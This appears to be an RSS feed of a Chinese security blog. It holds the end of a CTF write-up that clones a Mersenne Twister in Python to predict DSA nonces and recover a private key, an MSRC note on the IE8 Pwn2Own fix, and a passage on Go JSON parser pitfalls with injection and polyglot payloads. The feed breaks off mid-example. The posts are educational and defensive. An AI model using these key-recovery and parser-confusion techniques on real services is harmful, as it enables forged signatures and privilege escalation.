class=&#34;s2&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们实现了梅森旋转算法的克隆版本，可以预测未来的随机数输出：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ClonedMersenneTwister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;624&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;generate_numbers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2636928640&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4022730752&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;generate_numbers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;397&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2567483615&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;完整攻击流程&#34;&gt;完整攻击流程
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;通过多次调用&lt;code&gt;/forgotpass&lt;/code&gt;重建RNG内部状态&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;/sign&lt;/code&gt;获取签名(r,s)&lt;/li&gt;
&lt;li&gt;使用克隆的RNG预测k值&lt;/li&gt;
&lt;li&gt;解方程恢复私钥x&lt;/li&gt;
&lt;li&gt;验证x的正确性：pow(g,x,p)应当等于y&lt;/li&gt;
&lt;li&gt;获取挑战令牌并签名，提交到&lt;code&gt;/capture&lt;/code&gt;获取旗帜&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;在36小时的CSAW决赛中，44支队伍中有28支成功获取了旗帜。这个挑战展示了密码重置令牌生成与DSA签名随机数生成之间的意外关联，加上DSA算法的脆弱性，导致了灾难性的安全漏洞。&lt;/p&gt;
&lt;p&gt;在实际系统中，应避免使用非密码学安全的随机数生成器。如果不需要高性能或序列可重现性，应优先选择CSPRNG。此外，可以考虑使用更健壮的签名算法如ed25519(RFC 8032)，或采用确定性随机数生成(RFC 6979)来降低风险。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MS11-018修复IE8 pwn2own漏洞的技术分析</title>
        <link>http://localhost:1313/p/ms11-018%E4%BF%AE%E5%A4%8Die8-pwn2own%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 22:11:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ms11-018%E4%BF%AE%E5%A4%8Die8-pwn2own%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;p&gt;今天微软发布了MS11-018安全更新，修复了上个月CanSecWest 2011 Pwn2Own竞赛中用于攻破IE8的三个漏洞之一。成功入侵IE8需要组合利用这三个漏洞才能满足主办方的全部要求。&lt;/p&gt;
&lt;p&gt;本次修复的漏洞是一个不影响IE9的释放后使用(UAF)漏洞，攻击者主要利用该漏洞实现代码执行。第二个漏洞用于提高攻击可靠性，第三个漏洞则用于突破IE保护模式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IE9为何不受影响？&lt;/strong&gt;
在IE9开发过程中，团队内置了多项安全功能以尽早发现安全问题。该漏洞通过模糊测试发现，IE团队在10个月前就已修复。竞赛中用作信息泄露的另一个漏洞同样在IE9开发阶段被发现并修复。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为何修复速度如此之快？&lt;/strong&gt;
通常所有安全补丁都需要经过漫长的回归测试。本次修复同样经历了该流程，但由于该问题曾在IE9上测试过，使得修复进程得以加速。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其余两个漏洞何时修复？&lt;/strong&gt;
需要说明的是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一个是&amp;quot;堆地址泄露&amp;quot;漏洞，攻击者借此可避免大规模堆喷射。需注意该漏洞仅泄露堆地址而非堆内容（如虚表指针）&lt;/li&gt;
&lt;li&gt;第二个是IE保护模式绕过漏洞&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这两个漏洞正在评估中，将在后续更新周期修复。但若没有MS11-018修复的本月漏洞，其余漏洞不会对用户构成直接威胁。&lt;/p&gt;
&lt;p&gt;Fermin J. Serna, MSRC工程团队&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Go语言解析器中的意外安全陷阱</title>
        <link>http://localhost:1313/p/go%E8%AF%AD%E8%A8%80%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E6%84%8F%E5%A4%96%E5%AE%89%E5%85%A8%E9%99%B7%E9%98%B1/</link>
        <pubDate>Fri, 01 Aug 2025 22:04:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/go%E8%AF%AD%E8%A8%80%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E6%84%8F%E5%A4%96%E5%AE%89%E5%85%A8%E9%99%B7%E9%98%B1/</guid>
        <description>&lt;h1 id=&#34;go语言解析器中的意外安全陷阱&#34;&gt;Go语言解析器中的意外安全陷阱
&lt;/h1&gt;&lt;p&gt;在Go应用程序中，解析不可信数据会形成危险的攻击面。通过三个真实攻击场景，我们揭示了Go标准库解析器中的安全隐患：&lt;/p&gt;
&lt;h2 id=&#34;攻击场景1意外反序列化数据&#34;&gt;攻击场景1：意外(反)序列化数据
&lt;/h2&gt;&lt;p&gt;当开发者使用&lt;code&gt;json:&amp;quot;-&amp;quot;&lt;/code&gt;标记试图阻止字段被反序列化时，错误添加的逗号后缀会导致该字段仍可通过&lt;code&gt;&amp;quot;-&amp;quot;&lt;/code&gt;键被修改：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;IsAdmin&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;`json:&amp;#34;-,omitempty&amp;#34;`&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 错误配置：仍可通过{&amp;#34;-&amp;#34;:true}注入&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们创建的Semgrep规则可检测此类问题：&lt;code&gt;semgrep -c r/trailofbits.go.unmarshal-tag-is-dash&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;攻击场景2解析器差异&#34;&gt;攻击场景2：解析器差异
&lt;/h2&gt;&lt;p&gt;Go的JSON解析器存在两项危险特性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;重复键处理&lt;/strong&gt;：总是取最后出现的键值&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;大小写不敏感匹配&lt;/strong&gt;：&lt;code&gt;&amp;quot;action&amp;quot;&lt;/code&gt;、&lt;code&gt;&amp;quot;ACTION&amp;quot;&lt;/code&gt;甚至Unicode变体(&lt;code&gt;aKtionſ&lt;/code&gt;)都会被匹配&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当微服务架构中不同组件使用不同解析器时，这种差异会导致权限绕过：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;graph TD
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    A[恶意请求] --&amp;gt; B{&amp;#34;授权服务:解析为UserAction&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    A --&amp;gt; C{&amp;#34;业务服务:解析为AdminAction&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;攻击场景3数据格式混淆&#34;&gt;攻击场景3：数据格式混淆
&lt;/h2&gt;&lt;p&gt;通过构造特殊的多格式混合文件(Polyglot)，可使JSON/XML/YAML解析器解析同一文件时产生不同结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Action_1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;aCtIoN&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Action_2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
